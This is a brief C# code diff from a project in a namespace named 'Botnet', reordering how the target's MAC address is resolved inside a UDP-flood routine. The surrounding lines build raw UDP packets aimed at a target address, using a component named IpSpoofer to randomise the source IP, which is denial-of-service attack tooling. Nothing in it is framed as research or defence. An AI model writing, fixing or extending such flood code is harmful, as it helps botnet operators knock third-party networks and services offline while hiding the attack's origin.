@@ -95,8 +95,8 @@ namespace Botnet
             if (_params.UdpFloodEnabled)
             {
                 NetworkInstruments.IpRandomizer IpSpoofer = new NetworkInstruments.IpRandomizer();
+                PhysicalAddress TargetMac = NetworkInstruments.ResolveMac(Adapter, _params.Target.Address);
                 ICaptureDevice ActiveDevice = NetworkInstruments.getActiveDevice(Adapter.GetPhysicalAddress());
-                PhysicalAddress TargetMac = NetworkInstruments.ResolveMac((LibPcapLiveDevice)ActiveDevice, _params.Target.Address);
                 ActiveDevice.Open();
                 UdpPacket udpPacket = new UdpPacket(0, 80);
                 IPv4Packet ipPacket = new IPv4Packet(IPAddress.Any, _params.Target.Address);
